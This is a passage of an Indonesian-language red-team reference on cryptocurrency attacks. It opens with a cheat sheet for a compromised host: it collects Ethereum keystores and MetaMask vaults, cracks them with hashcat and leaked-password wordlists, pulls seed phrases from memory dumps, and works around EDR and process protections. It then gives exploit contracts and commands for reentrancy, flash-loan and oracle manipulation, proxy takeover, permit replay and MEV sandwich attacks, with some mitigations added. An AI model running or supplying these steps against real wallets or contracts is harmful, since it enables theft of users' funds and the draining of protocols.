| 2 | **MetaMask 12.x pakai `safeStorage` (Electron-style) di MV3** | Vault tidak lagi plaintext di Local Storage; kunci ada di OS keyring (DPAPI/Keychain/libsecret) | Dump keyring: `%APPDATA%\…\Local State`, macOS `security dump-keychain` |
| 3 | **Windows 11 24H2 + Chrome 131 = credential guard untuk extension?** | Procdump ke proses Chrome gagal (PPL) | Gunakan dump live dengan debugger ringan (Frida 16.5), atau snapshot disk offline (hiberfil/pagefile) |
| 4 | **LevelDB `.ldb` di-snappy-compress** | `strings` tidak menemukan vault | Decode dengan `plyvel`/`leveldb-cli`, jangan `strings` |
| 5 | **Path keystore Geth di-migrasi** | Geth ≥ 1.13 pakai `~/.ethereum/keystore` tetap, tapi Besu/Nethermind beda | Cek `--datadir` di service unit / config.toml |
| 6 | **`--lightkdf` diabaikan di cracker** | Estimasi waktu meleset 100× | Selalu parse `kdfparams.n` dulu; buat hash format `$ethereum$s*...` benar |
| 7 | **Mnemonic passphrase (25th word) terpisah** | Seed benar tapi alamat tidak cocok | Uji `m/44'/60'/0'/0/{0..20}` dan passphrase kosong-dua kali |
| 8 | **Wordlist non-English BIP39** | seedrecover gagal validasi checksum | `--language japanese/korean/spanish`, sertakan `--dsw` |
| 9 | **Hashcat 15700 salah urutan `n,r,p`** | 0% progress / false negative | Bandingkan dengan `btcrecover --list-wallets` yang menormalkan params |
| 10 | **Trezor/Ledger Live di host** | Dump tidak mengandung seed (Secure Element) | Hanya signature yang bisa diekstrak; seed butuh recovery manual + PIN |
| 11 | **File keystore di-share via cloud sync** | Versi lama (tanpa MAC) atau password kosong (`"password": ""` untuk testnet) | Coba password kosong dulu; cek `mac` valid |
| 12 | **EDR (Defender ASR, CrowdStrike) memblokir procdump/gcore** | Dump gagal silently atau proses dibunuh | Snapshot disk (FTK Imager 4.7 / WinPmem 4.0) + analisis offline |
| 13 | **ASLR + heap relokasi saat attach** | Alamat kunci bergeser mid-dump | Freeze proses (SIGSTOP), dump second pass, atau pakai `minidump -ma` |
| 14 | **Keystore v4 (EIP-2335)** | Struktur `crypto` → `crypto.kdf.params`, hashcat mode 15700 tidak cocok | Pakai `eth2-val-tools` / `staking-deposit-cli` writer; jangan campur dengan v3 |

### Cheat-sheet jalan cepat (host compromise)

```bash
# 1. Triase
find / -name "UTC--*" -o -name "*.json" 2>/dev/null | grep -Ei 'keystore|wallet|UTC--' > ks.txt
cp -a ~/.config/google-chrome/Default/Local\ Extension\ Settings/* /tmp/ext/ 2>/dev/null

# 2. Keystore lemah → hashcat 15700
for f in $(cat ks.txt); do
  jq -r '"$ethereum$s*"+.crypto.kdfparams.n+"*"+.crypto.kdfparams.r+"*"+.crypto.kdfparams.p+"*"+.crypto.kdfparams.salt+"*"+.crypto.ciphertext+"*"+.crypto.mac' $f >> hashes.txt
done
hashcat -m 15700 hashes.txt rockyou2024.txt -O -w 4

# 3. Vault MetaMask → brute password user (dari browser history/hibp)
python3 mm_vault_crack.py --vault /tmp/ext/nkbihf.../000003.log --wordlist leaked.txt

# 4. Seed dari dump
cryptoscan -f /tmp/dump/wallet.dmp --only mnemonic,hex,wic
```


## web3-defi

# web3-defi — crypto

# Web3/DeFi — Referensi Teknik Red Team

## 1. Reentrancy

**Vektor:** fungsi eksternal dipanggil sebelum state balance di-update.

**Kontrak rentan (Solidity ^0.8.20, target deploy anvil):**
```solidity
// VulnerableBank.sol
contract VulnerableBank {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no bal");
        (bool ok,) = msg.sender.call{value: bal}("");   // <-- reentrancy
        require(ok, "send fail");
        balances[msg.sender] = 0;                        // update setelah call
    }
}
```

**Exploit:**
```solidity
contract Attacker {
    VulnerableBank bank;
    constructor(address b) { bank = VulnerableBank(b); }
    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw();
    }
}
```

**Yang dikirim:** `attack()` dengan `value: 1 ether`.
**Yang muncul:** drain seluruh saldo kontrak; event `Withdrawal` berulang di blok yang sama.
**Kenapa berhasil:** CEI (Checks-Effects-Interactions) dilanggar. Mitigasi: `nonReentrant` (OpenZeppelin 5.1.0), CEI, atau `.transfer` (terbatas 2300 gas, tetap hindari).

**Varian read-only reentrancy:** view function (`getReserves`, `totalSupply`) dibaca pada hook `beforeTransfer` — umum di Curve/Balancer pool; target pada `priceOracle.getPrice()` saat callback.

---

## 2. Flash Loan Attack

**Vektor:** pinjam besar tanpa kolateral dalam satu tx, manipulasi state, bayar kembali.

**Skenario (Aave V3 pool `0x87870Bca...`, mainnet-fork):**
```solidity
function flashAttack() external {
    aave.flashLoanSimple(address(this), USDC, 10_000_000e6, "", 0);
}
function executeOperation(address, uint256 amount, uint256 fee, address, bytes calldata) external returns (bool) {
    usdc.approve(targetVault, amount);
    targetVault.deposit(amount);         // manipulasi share price
    targetVault.withdraw(amount * 95 / 100);
    usdc.approve(address(aave), amount + fee);
    return true;
}
```

**Perintah fork:**
```bash
anvil --fork-url $ETH_RPC --fork-block-number 21000000
forge script script/Flash.s.sol --rpc-url http://127.0.0.1:8545 --broadcast
```

**Yang muncul:** tx revert jika fee > profit; trace `forge script -vvvv` menunjukkan transfer ballik ke pool.
**Kenapa berhasil:** protokol target mengandalkan saldo on-chain sebagai sumber kebenaran (`balanceOf(pool)`), bukan akuntansi internal. Fee Aave V3 = 0.05%.

---

## 3. Price Oracle Manipulation

**Pola:** oracle baca `getReserves()` / `slot0()` dari DEX yang bisa digeser dalam satu blok.

**Contoh target (Uniswap V2 pair `getReserves`):**
```solidity
// VulnerableLending.sol
function borrow(uint256 amt) external {
    (uint112 r0, uint112 r1,) = pair.getReserves();
    uint256 price = uint256(r1) * 1e18 / uint256(r0); // TOKEN per WETH
    require(collateralValue(msg.sender, price) * 75 / 100 >= amt);
    token.transfer(msg.sender, amt);
}
```

**Exploit (Foundry):**
```solidity
function testManip() public {
    vm.deal(attacker, 1000 ether);
    vm.startPrank(attacker);
    router.swapExactETHForTokens{value: 500 ether}(0, path, attacker, block.timestamp);
    lending.borrow(1_000_000e18);       // pinjam dengan harga terinflasi
    router.swapExactTokensForETH(...);  // balikkan harga
    vm.stopPrank();
}
```

**Yang muncul:** tx sukses; trace menunjukkan `borrow` di antara dua swap.
**Kenapa berhasil:** spot price tanpa TWAP + tanpa cek `block.timestamp` + `msg.sender` boleh EOA.
**Mitigasi di target:** Chainlink feed (`latestRoundData`, cek `updatedAt` < 1h), Uniswap V3 TWAP 30m, cek `block.number` interaksi dalam blok yang sama dilarang.

**Varian read-only:** oracle baca `pool.get_virtual_price()` saat callback hook → dipakai Curve pool (`0x...`); umum di exploiter 2023 (JPEG'd, Hundred Finance).

---

## 4. Access Control & Proxy/Upgradeable

**Pola rentan:**
```solidity
// VaultV1.sol — EIP-1967 proxy di belakang
contract VaultV1 is UUPSUpgradeable, OwnableUpgradeable {
    // TIDAK ADA _authorizeUpgrade override, atau
    function _authorizeUpgrade(address) internal override {}   // <-- siapa saja
    function initialize(address o) external initializer { __Ownable_init(o); }
}
```

**Rantai serangan:**
1. Slot `initialize()` belum dipanggil → `attacker.initialize(attacker)`
2. Atau `_authorizeUpgrade` tanpa `onlyOwner` → `upgradeToAndCall(evilImpl, payload)`
3. `evilImpl` berisi `selfdestruct` / `delegatecall` ke attacker → drain storage.

**Payload upgrade:**
```solidity
contract EvilImpl {
    function pwn() external {
        assembly {
            sstore(0x00, caller())              // overwrite slot impl (0x360894..)
        }
        selfdestruct(payable(msg.sender));
    }
}
```

**Cek cepat (cast):**
```bash
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
cast call $PROXY "proxiableUUID()(bytes32)"
cast call $PROXY "owner()(address)"
```

**Kenapa berhasil:** storage slot EIP-1967 tidak terproteksi; `initializer` pada implementasi langsung belum di-`_disableInitializers()` (OpenZeppelin 4.x/5.x).
**Cek otomatis:** `slither-check-upgradeable $PROXY src/Vault.sol`.

---

## 5. Signature Replay (EIP-2612 Permit)

**Vektor:** signature tanpa `nonce`/`chainId`/`deadline` atau `permit` dipakai ulang.

**Kontrak rentan:**
```solidity
function permit(address owner, address spender, uint256 value, uint8 v, bytes32 r, bytes32 s) external {
    bytes32 h = keccak256(abi.encodePacked(owner, spender, value));
    require(ecrecover(h, v, r, s) == owner, "sig");
    allowance[owner][spender] = value;   // tidak ada nonce, tidak ada chainId
}
```

**Payload forge-cast:**
```bash
cast wallet sign --private-key $PK --no-hash $(cast keccak $(cast abi-encode "f(address,address,uint256)" $OWNER $SPENDER 1000000e6))
# Ambil v,r,s, kirim ke permit, ulangi tx -> allowance nambah lagi
```

**Yang muncul:** dua tx `permit` sukses, allowance dua kali.
**Kenapa berhasil:** tidak ada tracking nonce (EIP-2612 `nonces[owner]++`) dan tidak ada `chainId` di domain separator → cross-chain replay juga jalan (fork mainnet ke chainId 31337 tetap valid bila domain tidak di-bind).
**Perbaikan acuan:** OpenZeppelin `ERC20Permit` 5.x + `EIP712("NAME", "1")` + `block.chainid` di domain.

**Varian:** `eth_sign`/`personal_sign` replay di dApp — JSON-RPC `eth_sign` (hardhat `--hardfork shanghai`) mem-parse bytes apa adanya; hijack via signature phishing.

---

## 6. MEV Sandwich

**Vektor:** front-run + back-run swap korban dalam satu blok, ambil spread.

**Korban (bot dasar):**
```js
// bot.js — Node 20.11, ethers 6.13
await router.swapExactETHForTokens(0, [WETH, TOKEN], victim, deadline, { value: 1n * 10n**18n, gasLimit: 500000 });
```
Tanpa `amountOutMin` dan tanpa private mempool.

**Kontrak penyerang (sandwich):**
```solidity
contract Sandwich {
    function front(address router, address[] calldata path, uint256 amtIn) external {
        IUniswapV2Router(router).swapExactETHForTokens{value: amtIn}(0, path, address(this), block.timestamp + 1);
    }
    function back(address router, address[] calldata path, uint256 amtIn) external {
        IUniswapV2Router(router).swapExactTokensForETH(amtIn, 0, path, msg.sender, block.timestamp + 1);
    }
}
```

**Cara tembak:**
```bash
# 1. Deteksi victim
cast block pending txs
# 2. Submit bundle (Flashbots)
cast send --private-key $PK --bundle 0x... # atau via mev-share bundle endpoint
```

**Yang muncul:** trace blok: `front → victim.swap → back`, profit tercatat di `msg.sender.back`.
**Kenapa berhasil:** victim mengirim ke public mempool + `slippage = 100%`.
**Batas lapang:** tanpa Flashbots relay (mainnet `relay.flashbots.net`, Goerli deprecated), tx masuk publicmempool dan ikut disandwich balik; di L2 (Arbitrum/Optimism) sequencing FIFO membuat sandwich tetap jalan tapi tanpa gas war.

---

## 7. Tooling

| Tool | Versi | Perintah kunci | Output |
|---|---|---|---|
| Foundry | 1.0.0 (forge 1.0.0) | `forge test --match-contract X -vvvv` | trace call, opcode gas |
| Foundry fork | — | `forge test --fork-url $RPC --fork-block-number 21000000` | state fork |
| Slither | 0.10.4 | `slither . --checklist --json out.json` | JSON findings |
| Slither upgradeable | — | `slither-check-upgradeable $PROXY src/Impl.sol` | storage collision |
| Echidna | 2.2.5 | `echidna-test . --contract X --config echidna.yaml` | counterexample |
| Medusa | 1.2.0 | `medusa fuzz` | parallel fuzz |
| Halmos | 0.2.3 | `halmos --function check_` | symbolic |
| Heimdall-rs | 0.8.x | `heimdall decompile $ADDR` | pseudocode |
| cast (Foundry) | 1.0.0 | `cast storage`, `cast call`, `cast sig` | slot read |

**echidna.yaml minimal:**
```yaml
testMode: assertion
corpusDir: corpus
coverage: true
seqLen: 100
```

**Contoh invariant Echidna:**
```solidity
function echidna_balance_never_exceeds_deposits() public view returns (bool) {
    return address(bank).balance <= totalDeposited;
}
```

**Slither CI (GitHub Actions):**
```yaml
- uses: crytic/slither-action@v0.4.0
  with: { fail-on: medium }
```

**Foundry cepat:**
```bash
forge init exploit && cd exploit
forge install OpenZeppelin/openzeppelin-contracts@v5.1.0
forge build --sizes
forge test --gas-report
```

---

## 8. Jebakan Operasional di Lapangan

- **Fork block mismatch:** `--fork-block-number` berbeda dari saat target deploy → storage layout proxy beda, `cast storage` baca slot kosong → false negative.
- **EIP-1967 slot tidak selalu sama:** Beacon proxy pakai `0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50`, bukan `0x360894...`. Cek `implementation()` dulu, jangan asumsi.
- **`call{value:}` vs `transfer`:** di rantai post-Istanbul (semua rantai modern), `transfer` masih 2300 gas, tapi proxy implementation bisa butuh >2300 → tx gagal, bukan celah.
- **Permit EIP-2612 di L2:** `chainId` L2 (42161, 10) beda dari mainnet — replay cross-chain berhasil hanya bila domain separator tidak di-bind ke `block.chainid` saat sign; banyak kontrak lama pakai constant yang di-set saat deploy = aman cross-chain.
- **Flash loan fee berubah:** Aave V3 fee 0.05%, Balancer 0%, Uniswap V3 0.01–1% per tier — hitung ulang profitabilitas; test `forge test` dapat profit, on-chain gas spike (L1 30 gwei → 120 gwei) mengubah profit jadi negatif.
- **MEV bundle tidak selalu masuk:** Flashbots relay rate-limit 1 bundle/detik/ip, bundle gagal jika nonce konflik dengan tx publik lain pada blok yang sama; di L2 tidak ada Flashbots — pakai sequencer private RPC (Arbitrum `sequencer.arbitrum.io/rpc`) tapi tidak menjamin ordering.
- **Echidna timeout:** default 300s; kontrak >24KB bytecode dengan proxy (delegatecall) sering tidak di-instrument; set `testMode: property` dan `seqLen` lebih kecil.
- **Slither false positive access-control:** `arbitrary-send-eth` sering trigger pada router/factory — filter `--exclude-dependencies` dan reviewer manual tetap wajib.
- **Foundry `--via-ir`:** optimasi IR dapat mengubah urutan evaluasi `require` dan `call` — exploit yang berhasil di build default bisa revert di build `--via-ir` (dan sebaliknya). Selalu nyatakan profil build di laporan.
- **RPC archive:** `eth_getStorageAt` pada block lama butuh archive node (`alchemy --archive`, `erigon`); node pruned mengembalikan `0x0` diam-diam → trace salah.
